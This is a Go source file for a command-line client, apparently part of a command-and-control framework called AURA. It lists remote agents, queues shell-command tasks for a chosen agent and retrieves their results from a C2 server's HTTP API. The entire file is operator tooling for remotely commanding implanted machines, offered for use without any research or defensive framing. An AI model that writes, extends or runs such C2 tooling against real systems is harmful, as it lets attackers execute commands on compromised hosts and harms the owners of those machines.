/*
AURA C2 CLIENT (CLI)

Command-line client for controlling C2 agents.
*/
package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"net/http"
	"os"
)

type C2Client struct {
	serverURL string
}

func NewC2Client(serverURL string) *C2Client {
	return &C2Client{serverURL: serverURL}
}

func (c *C2Client) ListAgents() error {
	resp, err := http.Get(fmt.Sprintf("%s/api/c2/agents", c.serverURL))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)

	data, _ := json.MarshalIndent(result, "", "  ")
	fmt.Println(string(data))
	return nil
}

func (c *C2Client) ExecuteTask(agentID, taskType, command string, args map[string]interface{}) error {
	task := map[string]interface{}{
		"type":    taskType,
		"command": command,
		"args":    args,
	}

	data, _ := json.Marshal(task)

	resp, err := http.Post(
		fmt.Sprintf("%s/api/c2/execute?agent=%s", c.serverURL, agentID),
		"application/json",
		bytes.NewBuffer(data),
	)

	if err != nil {
		return err
	}
	defer resp.Body.Close()

	var result map[string]string
	json.NewDecoder(resp.Body).Decode(&result)

	fmt.Printf("[+] Task created: %s\n", result["task_id"])
	return nil
}

func (c *C2Client) GetResults(agentID string) error {
	resp, err := http.Get(fmt.Sprintf("%s/api/c2/results?agent=%s", c.serverURL, agentID))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)

	data, _ := json.MarshalIndent(result, "", "  ")
	fmt.Println(string(data))
	return nil
}

func main() {
	serverURL := flag.String("s", "http://localhost:9000", "C2 Server URL")
	command := flag.String("cmd", "", "Command (list-agents, exec, results)")
	agentID := flag.String("agent", "", "Agent ID")
	taskType := flag.String("type", "shell", "Task type")
	taskCmd := flag.String("task", "", "Task command")

	flag.Parse()

	client := NewC2Client(*serverURL)

	switch *command {
	case "list-agents":
		client.ListAgents()

	case "exec":
		if *agentID == "" || *taskCmd == "" {
			fmt.Println("Error: -agent and -task required for exec command")
			os.Exit(1)
		}
		client.ExecuteTask(*agentID, *taskType, *taskCmd, map[string]interface{}{})

	case "results":
		if *agentID == "" {
			fmt.Println("Error: -agent required for results command")
			os.Exit(1)
		}
		client.GetResults(*agentID)

	default:
		fmt.Println("Usage:")
		fmt.Println("  aura-c2-client -cmd list-agents")
		fmt.Println("  aura-c2-client -cmd exec -agent <id> -task <command>")
		fmt.Println("  aura-c2-client -cmd results -agent <id>")
	}
}
